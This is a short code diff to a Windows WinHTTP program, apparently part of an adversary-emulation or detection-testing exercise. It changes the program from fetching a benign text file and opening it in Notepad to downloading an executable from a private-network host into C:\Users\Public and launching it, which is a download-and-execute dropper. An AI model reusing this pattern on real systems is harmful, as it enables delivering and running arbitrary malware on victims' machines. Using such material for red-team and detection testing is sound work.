@@ -19,9 +19,10 @@ int main()
     LPCWSTR userAgent = L"A03_2_WinHTTP/1.0";
     LPCWSTR serverName = L"192.168.67.5";
     INTERNET_PORT port = 80;
-    LPCWSTR path = L"/artifact.txt"; // host a benign text file
+    LPCWSTR path = L"/A03_2_dropped_exe.exe"; // host custom executable
 
-    const char *localFile = "downloaded_artifact.txt";
+    const char *localFile = R"(C:\Users\Public\A03_2_dropped_exe.exe)";
+    ;
 
     // Create local output file
     hFile = CreateFileA(
@@ -161,7 +162,8 @@ int main()
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
-    char cmdLine[] = "notepad.exe downloaded_artifact.txt";
+    char cmdLine[] = R"(C:\Users\Public\A03_2_dropped_exe.exe)";
+    ;
 
     if (CreateProcessA(
             NULL,
